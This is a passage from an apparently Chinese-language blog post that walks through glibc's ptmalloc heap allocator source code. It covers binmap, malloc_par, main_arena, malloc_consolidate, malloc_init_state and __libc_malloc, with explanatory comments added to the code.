any</span><br><span class="hljs-comment">   fastbin, and cleared only in malloc_consolidate.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">   The truth value is inverted so that have_fastchunks will be true</span><br><span class="hljs-comment">   upon startup (since statics are zero-filled), simplifying</span><br><span class="hljs-comment">   initialization checks.</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> FASTCHUNKS_BIT        (1U)</span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> have_fastchunks(M)     (((M)-&gt;flags &amp; FASTCHUNKS_BIT) == 0)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> clear_fastchunks(M)    catomic_or (&amp;(M)-&gt;flags, FASTCHUNKS_BIT)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> set_fastchunks(M)      catomic_and (&amp;(M)-&gt;flags, ~FASTCHUNKS_BIT)</span><br></code></pre></div></td></tr></table></figure><p><strong>Binmap</strong> </p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">   Binmap</span><br><span class="hljs-comment">    To help compensate for the large number of bins, a one-level index</span><br><span class="hljs-comment">    structure is used for bin-by-bin searching.  `binmap&#x27; is a</span><br><span class="hljs-comment">    bitvector recording whether bins are definitely empty so they can</span><br><span class="hljs-comment">    be skipped over during during traversals.  The bits are NOT always</span><br><span class="hljs-comment">    cleared as soon as bins are empty, but instead only</span><br><span class="hljs-comment">    when they are noticed to be empty during traversal in malloc.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-comment">/* Conservatively use 32 bits per map word, even if on 64bit system */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> BINMAPSHIFT      5</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> BITSPERMAP       (1U &lt;&lt; BINMAPSHIFT)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> BINMAPSIZE       (NBINS / BITSPERMAP)<span class="hljs-comment">//32 bits per map word,every bit is useful</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> idx2block(i)     ((i) &gt;&gt; BINMAPSHIFT)<span class="hljs-comment">//第6位及以后确定block</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> idx2bit(i)       ((1U &lt;&lt; ((i) &amp; ((1U &lt;&lt; BINMAPSHIFT) - 1))))<span class="hljs-comment">//i &amp; 31:取出低5位决定在block中的bit</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> mark_bin(m, i)    ((m)-&gt;binmap[idx2block (i)] |= idx2bit (i))</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> unmark_bin(m, i)  ((m)-&gt;binmap[idx2block (i)] &amp;= ~(idx2bit (i)))</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> get_binmap(m, i)  ((m)-&gt;binmap[idx2block (i)] &amp; idx2bit (i))</span><br></code></pre></div></td></tr></table></figure><h3 id="malloc-par"><a href="#malloc-par" class="headerlink" title="malloc_par"></a>malloc_par</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_par</span> //<span class="hljs-title">malloc</span> <span class="hljs-title">parameter</span>, 堆管理器的相关参数</span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-comment">/* Tunable parameters */</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> trim_threshold;<br>  INTERNAL_SIZE_T top_pad;<br>  INTERNAL_SIZE_T mmap_threshold;<br>  INTERNAL_SIZE_T arena_test;<br>  INTERNAL_SIZE_T arena_max;<br><br>  <span class="hljs-comment">/* Memory map support */</span><br>  <span class="hljs-keyword">int</span> n_mmaps;<br>  <span class="hljs-keyword">int</span> n_mmaps_max;<br>  <span class="hljs-keyword">int</span> max_n_mmaps;<br>  <span class="hljs-comment">/* the mmap_threshold is dynamic, until the user sets</span><br><span class="hljs-comment">     it manually, at which point we need to disable any</span><br><span class="hljs-comment">     dynamic behavior. */</span><br>  <span class="hljs-keyword">int</span> no_dyn_threshold;<br><br>  <span class="hljs-comment">/* Statistics */</span><br>  INTERNAL_SIZE_T mmapped_mem;<br>  INTERNAL_SIZE_T max_mmapped_mem;<br><br>  <span class="hljs-comment">/* First address handed out by MORECORE/sbrk.  */</span><br>  <span class="hljs-keyword">char</span> *sbrk_base;<br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> USE_TCACHE</span><br>  <span class="hljs-comment">/* Maximum number of buckets to use.  */</span><br>  <span class="hljs-keyword">size_t</span> tcache_bins;<br>  <span class="hljs-keyword">size_t</span> tcache_max_bytes;<br>  <span class="hljs-comment">/* Maximum number of chunks in each bucket.  */</span><br>  <span class="hljs-keyword">size_t</span> tcache_count;<br>  <span class="hljs-comment">/* Maximum number of chunks to remove from the unsorted list, which</span><br><span class="hljs-comment">     aren&#x27;t used to prefill the cache.  */</span><br>  <span class="hljs-keyword">size_t</span> tcache_unsorted_limit;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br>&#125;;<br></code></pre></div></td></tr></table></figure><ul><li>当每个分配区的 top chunk 大小大于<strong>trim_threshold</strong>时，在一定的条件下，调用 free 时会收缩内存，减小 top chunk 的大小。</li><li><strong>top_pad</strong> 字段表示在分配内存时是否添加额外的 pad，默认该字段为 0。 </li><li><strong>mmap_threshold</strong> 字段表示 mmap 分配阈值，默认值为 128KB，在 32 位系统上最大值为 512KB，64 位系统上的最大值为 32MB，由于默认开启 mmap 分配阈值动态调整，该字段的 值会动态修改，但不会超过最大值。 </li><li><strong>arena_test</strong> 和 <strong>arena_max</strong> 用于 PER_THREAD 优化，在 32 位系统上 arena_test 默认值为 2， 64 位系统上的默认值为 8，当每个进程的分配区数量小于等于 arena_test 时，不会重用已有 的分配区。为了限制分配区的总数，用 arena_max 来保存分配区的最大数量，当系统中的分 配区数量达到 arena_max，就不会再创建新的分配区，只会重用已有的分配区。这两个字段 都可以使用 mallopt()函数设置。 </li><li><strong>n_mmaps</strong> 字段表示当前进程使用 mmap()函数分配的内存块的个数。 </li><li><strong>n_mmaps_max</strong> 字段表示进程使用 mmap()函数分配的内存块的最大数量，默认值为65536，可以使用 mallopt()函数修改</li><li><strong>max_n_mmaps</strong> 字段表示当前进程使用 mmap()函数分配的内存块的数量的最大值，有关系 n_mmaps &lt;= max_n_mmaps 成立。这个字段是由于 mstats()函数输出统计需要这个字段。 </li><li><strong>no_dyn_threshold</strong> 字段表示是否开启 mmap 分配阈值动态调整机制，默认值为 0，也就 是默认开启 mmap 分配阈值动态调整机制。 </li><li><strong>pagesize</strong> 字段表示系统的页大小，默认为 4KB。 </li><li><strong>mmapped_mem</strong> 和 <strong>max_mmapped_mem</strong> 都用于统计 mmap 分配的内存大小，一般情况 下两个字段的值相等，max_mmapped_mem 用于 mstats()函数。 </li><li><strong>max_total_mem</strong> 字段在单线程情况下用于统计进程分配的内存总数。 </li><li><strong>sbrk_base</strong> 字段表示堆的起始地址。</li></ul><h3 id="main-arena"><a href="#main-arena" class="headerlink" title="main_arena"></a>main_arena</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_state</span> <span class="hljs-title">main_arena</span> =</span> <span class="hljs-comment">//main_arena是一个里libc中的全局静态变量</span><br>&#123;<br>  .mutex = _LIBC_LOCK_INITIALIZER,<br>  .next = &amp;main_arena,<br>  .attached_threads = <span class="hljs-number">1</span><br>&#125;;<br></code></pre></div></td></tr></table></figure><h3 id="mp"><a href="#mp" class="headerlink" title="mp_"></a>mp_</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* There is only one instance of the malloc parameters.  */</span><br><br><span class="hljs-keyword">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_par</span> <span class="hljs-title">mp_</span> =</span><br>&#123;<br>  .top_pad = DEFAULT_TOP_PAD,<br>  .n_mmaps_max = DEFAULT_MMAP_MAX,<br>  .mmap_threshold = DEFAULT_MMAP_THRESHOLD,<br>  .trim_threshold = DEFAULT_TRIM_THRESHOLD,<br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> NARENAS_FROM_NCORES(n) ((n) * (sizeof (long) == 4 ? 2 : 8))</span><br>  .arena_test = NARENAS_FROM_NCORES (<span class="hljs-number">1</span>)<br><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> USE_TCACHE</span><br>  ,<br>  .tcache_count = TCACHE_FILL_COUNT,<br>  .tcache_bins = TCACHE_MAX_BINS,<br>  .tcache_max_bytes = tidx2usize (TCACHE_MAX_BINS<span class="hljs-number">-1</span>),<br>  .tcache_unsorted_limit = <span class="hljs-number">0</span> <span class="hljs-comment">/* No limit.  */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br>&#125;;<br></code></pre></div></td></tr></table></figure><ul><li>设置了<code>top_pad</code>为 0</li><li>设置了<code>n_maps_max</code>为 65535</li><li>设置了<code>mmap_threshold</code>为 128 * 1024</li><li>设置了<code>trim_threshold</code>为 128 * 1024</li><li>设置了<code>arena_test</code>在gcc中32下为2，64位下为8（不同的编译器中long的长度可能不同，这里仅以gcc为例）</li></ul><h3 id="malloc-consolidate"><a href="#malloc-consolidate" class="headerlink" title="malloc_consolidate"></a><span id="malloc_consolidate"><strong>malloc_consolidate</strong></span></h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">  ------------------------- malloc_consolidate -------------------------</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">  malloc_consolidate is a specialized version of free() that tears</span><br><span class="hljs-comment">  down chunks held in fastbins.  Free itself cannot be used for this</span><br><span class="hljs-comment">  purpose since, among other things, it might place chunks back onto</span><br><span class="hljs-comment">  fastbins.  So, instead, we need to use a minor variant of the same</span><br><span class="hljs-comment">  code.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">  Also, because this routine needs to be called the first time through</span><br><span class="hljs-comment">  malloc anyway, it turns out to be the perfect place to trigger</span><br><span class="hljs-comment">  initialization code.</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">malloc_consolidate</span><span class="hljs-params">(mstate av)</span></span><br><span class="hljs-function"></span>&#123;<br>  mfastbinptr*    fb;                 <span class="hljs-comment">/* current fastbin being consolidated */</span><br>  mfastbinptr*    maxfb;              <span class="hljs-comment">/* last fastbin (for loop control) */</span><br>  mchunkptr       p;                  <span class="hljs-comment">/* current chunk being consolidated */</span><br>  mchunkptr       nextp;              <span class="hljs-comment">/* next chunk to consolidate */</span><br>  mchunkptr       unsorted_bin;       <span class="hljs-comment">/* bin header */</span><br>  mchunkptr       first_unsorted;     <span class="hljs-comment">/* chunk to link to */</span><br><br>  <span class="hljs-comment">/* These have same use as in free() */</span><br>  mchunkptr       nextchunk;<br>  INTERNAL_SIZE_T size;<br>  INTERNAL_SIZE_T nextsize;<br>  INTERNAL_SIZE_T prevsize;<br>  <span class="hljs-keyword">int</span>             nextinuse;<br>  mchunkptr       bck;<br>  mchunkptr       fwd;<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">      If max_fast is 0, we know that av hasn&#x27;t</span><br><span class="hljs-comment">      yet been initialized, in which case do so below</span><br><span class="hljs-comment">    */</span><br>    <span class="hljs-comment">// 说明 fastbin 已经初始化</span><br>    <span class="hljs-keyword">if</span> (get_max_fast() != <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-comment">// 清空 fastbin 标记</span><br>        <span class="hljs-comment">// 因为要合并 fastbin 中的 chunk 了。</span><br>        clear_fastchunks(av);<br>        <span class="hljs-comment">//</span><br>        unsorted_bin = unsorted_chunks(av);<br><br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">          Remove each chunk from fast bin and consolidate it, placing it</span><br><span class="hljs-comment">          then in unsorted bin. Among other reasons for doing this,</span><br><span class="hljs-comment">          placing in unsorted bin avoids needing to calculate actual bins</span><br><span class="hljs-comment">          until malloc is sure that chunks aren&#x27;t immediately going to be</span><br><span class="hljs-comment">          reused anyway.</span><br><span class="hljs-comment">        */</span><br>        <span class="hljs-comment">// 按照 fd 顺序遍历 fastbin 的每一个 bin，将 bin 中的每一个 chunk 合并掉。</span><br>        maxfb = &amp;fastbin(av, NFASTBINS - <span class="hljs-number">1</span>);<br>        fb    = &amp;fastbin(av, <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">do</span> &#123;<br>            p = atomic_exchange_acq(fb, <span class="hljs-literal">NULL</span>);<br>            <span class="hljs-keyword">if</span> (p != <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-keyword">do</span> &#123;<br>                    check_inuse_chunk(av, p);<br>                    nextp = p-&gt;fd;<br><br>                    <span class="hljs-comment">/* Slightly streamlined version of consolidation code in</span><br><span class="hljs-comment">                     * free() */</span><br>                    size      = chunksize(p);<br>                    nextchunk = chunk_at_offset(p, size);<br>                    nextsize  = chunksize(nextchunk);<br><br>                    <span class="hljs-keyword">if</span> (!prev_inuse(p)) &#123;<span class="hljs-comment">//p的前一块空闲马上取出, 计算合并后大小</span><br>                        prevsize = prev_size(p);<br>                        size += prevsize;<br>                        p = chunk_at_offset(p, -((<span class="hljs-keyword">long</span>) prevsize));<br>                        unlink(av, p, bck, fwd);<br>                    &#125;<br><br>                    <span class="hljs-keyword">if</span> (nextchunk != av-&gt;top) &#123; <br>                        <span class="hljs-comment">// 判断 nextchunk 是否是空闲的。</span><br>                        nextinuse = inuse_bit_at_offset(nextchunk, nextsize);<br><br>                        <span class="hljs-keyword">if</span> (!nextinuse) &#123; <span class="hljs-comment">//p的后一块空闲马上取出, 计算合并后大小</span><br>                            size += nextsize;<br>                            unlink(av, nextchunk, bck, fwd);<br>                        &#125; <span class="hljs-keyword">else</span><br>                         <span class="hljs-comment">// 设置 nextchunk 的 prev inuse 为0，以表明可以合并当前 fast chunk。</span><br>                            clear_inuse_bit_at_offset(nextchunk, <span class="hljs-number">0</span>);<br>                        <br>                        <span class="hljs-comment">//插入unsorted bin的常规操作</span><br>                        first_unsorted     = unsorted_bin-&gt;fd;<br>                        unsorted_bin-&gt;fd   = p;<br>                        first_unsorted-&gt;bk = p;<br><br>                        <span class="hljs-keyword">if</span> (!in_smallbin_range(size)) &#123;<br>                            p-&gt;fd_nextsize = <span class="hljs-literal">NULL</span>;<br>                            p-&gt;bk_nextsize = <span class="hljs-literal">NULL</span>;<br>                        &#125;<br><br>                        set_head(p, size | PREV_INUSE);<br>                        p-&gt;bk = unsorted_bin;<br>                        p-&gt;fd = first_unsorted;<br>                        set_foot(p, size);<br>                    &#125;<br>                    <span class="hljs-keyword">else</span> &#123; <span class="hljs-comment">//直接和top chunk合并</span><br>                        size += nextsize;<br>                        set_head(p, size | PREV_INUSE);<br>                        av-&gt;top = p;<br>                    &#125;<br><br>                &#125; <span class="hljs-keyword">while</span> ((p = nextp) != <span class="hljs-number">0</span>);<br>            &#125;<br>        &#125; <span class="hljs-keyword">while</span> (fb++ != maxfb);<br>  &#125;<br>  <span class="hljs-keyword">else</span> &#123; <span class="hljs-comment">//如果还没有初始化</span><br>    malloc_init_state(av);<br>    check_malloc_state(av);<br>  &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="malloc-init-state"><a href="#malloc-init-state" class="headerlink" title="malloc_init_state"></a>malloc_init_state</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">   Initialize a malloc_state struct.</span><br><span class="hljs-comment">   This is called from ptmalloc_init () or from _int_new_arena ()</span><br><span class="hljs-comment">   when creating a new arena.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">malloc_init_state</span><span class="hljs-params">(mstate av)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> i;<br>    mbinptr bin;<br>    <span class="hljs-comment">/* Establish circular links for normal bins */</span><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">1</span>; i &lt; NBINS; ++i)<br>    &#123;<br>        bin = bin_at(av, i);<br>        bin-&gt;fd = bin-&gt;bk = bin; <span class="hljs-comment">//初始化, 把所有指针都指向自己</span><br>    &#125;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> MORECORE_CONTIGUOUS</span><br>    <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br>        set_noncontiguous(av);<br>    <span class="hljs-keyword">if</span> (av == &amp;main_arena)<br>        set_max_fast(DEFAULT_MXFAST);<br>    <span class="hljs-comment">//2.26, 一个arena在默认情况下并不拥有fastbin chunk</span><br>    atomic_store_relaxed(&amp;av-&gt;have_fastchunks, <span class="hljs-literal">false</span>);<br>    <span class="hljs-comment">//2.25:</span><br>    av-&gt;flags |= FASTCHUNKS_BIT;<br>    <span class="hljs-comment">//将该areva的top chunk指针指向unsorted bin，用以表示初始时top chunk大小为0</span><br>    av-&gt;top = initial_top(av);<br>&#125;<br></code></pre></div></td></tr></table></figure><h1 id="申请内存块"><a href="#申请内存块" class="headerlink" title="申请内存块"></a>申请内存块</h1><h2 id="–libc-malloc"><a href="#–libc-malloc" class="headerlink" title="  –libc-malloc"></a><span id="__libc_malloc"> </span> <a href="#libcmalloc">–libc-malloc</a></h2><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">//这只是一个_int_malloc函数的简单wrapper</span><br><span class="hljs-keyword">void</span> * __libc_malloc (<span class="hljs-keyword">size_t</span> bytes)<br>&#123;<br>  mstate ar_ptr;<br>  <span class="hljs-keyword">void</span> *victim;<br>  <span class="hljs-comment">// 检查是否有内存分配钩子，如果有，调用钩子并返回.</span><br>  <span class="hljs-keyword">void</span> *(*hook) (<span class="hljs-keyword">size_t</span>, <span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> *)<br>    = atomic_forced_read (__malloc_hook);<br>  <span class="hljs-keyword">if</span> (__builtin_expect (hook != <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>))<br>    <span class="hljs-keyword">return</span> (*hook)(bytes, RETURN_ADDRESS (<span class="hljs-number">0</span>));<br>    <br><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> USE_TCACHE</span><br>  <span class="hljs-comment">/* int_free also calls request2size, be careful to not pad twice.  */</span><br>  <span class="hljs-keyword">size_t</span> tbytes = request2size (bytes);<br>  <span class="hljs-keyword">size_t</span> tc_idx = csize2tidx (tbytes);<br><br>  MAYBE_INIT_TCACHE ();<br><br>  DIAG_PUSH_NEEDS_COMMENT;<br>  <span class="hljs-keyword">if</span> (tc_idx &lt; mp_.tcache_bins<br>      <span class="hljs-comment">/*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/</span> <span class="hljs-comment">/* to appease gcc */</span><br>      &amp;&amp; tcache<br>      &amp;&amp; tcache-&gt;entries[tc_idx] != <span class="hljs-literal">NULL</span>)<br>    &#123;<br>      <span class="hljs-keyword">return</span> tcache_get (tc_idx);<br>    &#125;<br>  DIAG_POP_NEEDS_COMMENT;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br>    <br>  <span class="hljs-comment">//接着会寻找一个 arena 来试图分配内存</span><br>  arena_get (ar_ptr, bytes);<br>  <span class="hljs-comment">//然后调用 _int_malloc 函数去申请对应的内存</span><br>  victim = _int_malloc (ar_ptr, bytes);<br>  <span class="hljs-comment">/* Retry with another arena only if we were able to find a usable arena</span><br><span class="hljs-comment">     before.  */</span><br>  <span class="hljs-keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="hljs-literal">NULL</span>)<br>    &#123;<span class="hljs-comment">//如果分配失败的话，ptmalloc 会尝试再去寻找一个可用的 arena，并分配内存</span><br>      LIBC_PROBE (memory_malloc_retry, <span class="hljs-number">1</span>, bytes);<br>      ar_ptr = arena_get_retry (ar_ptr, bytes);<br>      victim = _int_malloc (ar_ptr, bytes);<br>    &#125;<br><br>  <span class="hljs-keyword">if</span> (ar_ptr != <span class="hljs-literal">NULL</span>)<span class="hljs-comment">//如果申请到了 arena，那么在退出之前还得解锁</span><br>    __libc_lock_unlock (ar_ptr-&gt;mutex);<br>  <span class="hljs-comment">//要么没有申请到内存</span><br>  <span class="hljs-comment">//要么是 mmap 的内存</span><br>  <span class="hljs-comment">//要么申请到的内存必须在其所分配的 arena 中</span><br>  assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||<br>          ar_ptr == arena_for_chunk (mem2chunk (victim)));<br>  <span class="hljs-comment">//最后返回内存</span><br>  <span class="hljs-keyword">return</span> victim;<br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="int-malloc-非常之长"><a href="#int-malloc-非常之长" class="headerlink" title="_int_malloc(非常之长)"></a>_int_malloc(非常之长)</h2><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> * _int_malloc (mstate av, <span class="hljs-keyword">size_t</span> bytes)<br></code></pre></div></td></tr></table></figure><h3 id="变量定义"><a href="#变量定义" class="headerlink" title="变量定义"></a>变量定义</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">  INTERNAL_SIZE_T nb;               <span class="hljs-comment">/* normalized request size */</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> idx;                 <span class="hljs-comment">/* associated bin index */</span><br>  mbinptr bin;                      <span class="hljs-comment">/* associated bin */</span><br>  mchunkptr victim;                 <span class="hljs-comment">/* inspected/selected chunk */</span><br>  INTERNAL_SIZE_T size;             <span class="hljs-comment">/* its size */</span><br>  <span class="hljs-keyword">int</span> victim_index;                 <span class="hljs-comment">/* its bin index */</span><br>  mchunkptr remainder;              <span class="hljs-comment">/* remainder from a split */</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> remainder_size;     